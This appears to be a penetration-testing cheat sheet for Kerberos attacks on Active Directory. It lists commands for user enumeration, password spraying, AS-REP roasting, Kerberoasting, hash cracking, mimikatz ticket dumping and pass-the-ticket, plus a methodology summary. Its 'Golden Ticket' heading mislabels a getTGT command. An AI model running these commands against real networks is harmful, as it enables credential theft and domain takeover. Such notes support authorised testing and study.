# Enumeration
## nmap Kerberos scripts
```bash
nmap -p 88 --script=krb5-enum-users,krb5-realm $IP
```
## Enumerate usernames with kerbrute
```bash
kerbrute userenum -d domain.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```
## Password spray with kerbrute
```bash
kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
```

## Rubeus (Kali Source)
```
/usr/share/windows-resources/rubeus/Rubeus.exe
```
# AS-REP Roasting

## Rubeus AS-REPRoast
```
.\Rubeus.exe asreproast
```

## Check for ASREPRoastable users with impacket
```bash
impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
```

## Request ASREPRoast hashes for specific user
```bash
impacket-GetNPUsers domain.local/username -dc-ip $IP -no-pass
```

## ASREPRoast with netexec
```bash
netexec ldap $IP -u users.txt -p '' --asreproast asrep_hashes.txt
```

## Hashcat ASREPRoast
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

# Kerberoasting

## Kerberoast (Rubeus)
```
.\Rubeus.exe kerberoast
```
##  Kerberoast (impacket)
```bash
impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
```

## Kerberoast (netexec)
```bash
netexec ldap $IP -u username -p password --kerberoasting kerberoast_hashes.txt
```

## Crack TGS from Kerberoast (hashcat)
```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

# Dump Tickets from LSA 
```
.\mimikatz "privilege::debug" "sekurlsa::tickets /export"
```

# Golden Ticket
## Request TGT with NTLM hash
```bash
impacket-getTGT domain.local/username -hashes :ntlm_hash
```

## Set Kerberos ticket for authentication with impacket utilities
```bash
export KRB5CCNAME=username.ccache
```

## impacket execute commands using a kerberos ticket
```bash
impacket-psexec domain.local/username@target.domain.local -k -no-pass
```

---

# Kerberos Enumeration Methodology

## Initial Reconnaissance

1. Identify Kerberos service on port 88
2. Enumerate domain users (via SMB, LDAP, or RPC)
3. Check for ASREPRoastable users (no preauth required)
4. Attempt password spraying with common passwords
5. If credentials obtained, perform Kerberoasting
6. Crack obtained hashes offline

## ASREPRoasting Attack
1. Enumerate users (kerbrute, netexec, or rpcclient)
2. Test users for accounts with "Do not require Kerberos preauthentication" enabled  (GetNPUsers)
3. Collect AS-REP hashes
4. Crack hashes

## Kerberoasting Attack
1. Obtain valid domain credentials (any user)
2. Query for accounts with SPNs (GetUserSPNs)
3. Request TGS tickets for those services
4. Crack tickets offline to recover service account passwords
## Username Enumeration

**kerbrute:** Fast, uses Kerberos pre-authentication to validate usernames without triggering account lockouts.

**netexec/rpcclient:** Enumerate via SMB/RPC null sessions if allowed.

**enum4linux-ng:** Comprehensive enumeration if null sessions work.

**Common username wordlists:**
- /usr/share/wordlists/seclists/Usernames/Names/names.txt
- /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

## Password Spraying
- Use one password against many users (avoid account lockouts)
- Common passwords: Password123!, Welcome123!, Summer2024!, CompanyName2024!
- Monitor for account lockouts
## Pass-the-Ticket Attacks

Once you have a valid TGT (Ticket Granting Ticket):
1. Export KRB5CCNAME environment variable
2. Use -k flag with impacket tools
3. Authenticate without knowing the password

## Overpass-the-Hash

If you have NTLM hash but not plaintext password:
1. Request TGT with hash using getTGT
2. Use resulting ticket for authentication
3. Effective privilege escalation technique

## Golden Ticket Attack

If krbtgt hash is obtained (requires Domain Admin):
1. Create forged TGT with ticketer
2. Grant yourself any privileges
3. Access any resource in the domain
4. Persistence mechanism (tickets valid until krbtgt password changed)

---

# References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- https://github.com/GhostPack/Rubeus
- https://github.com/SecureAuthCorp/impacket
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
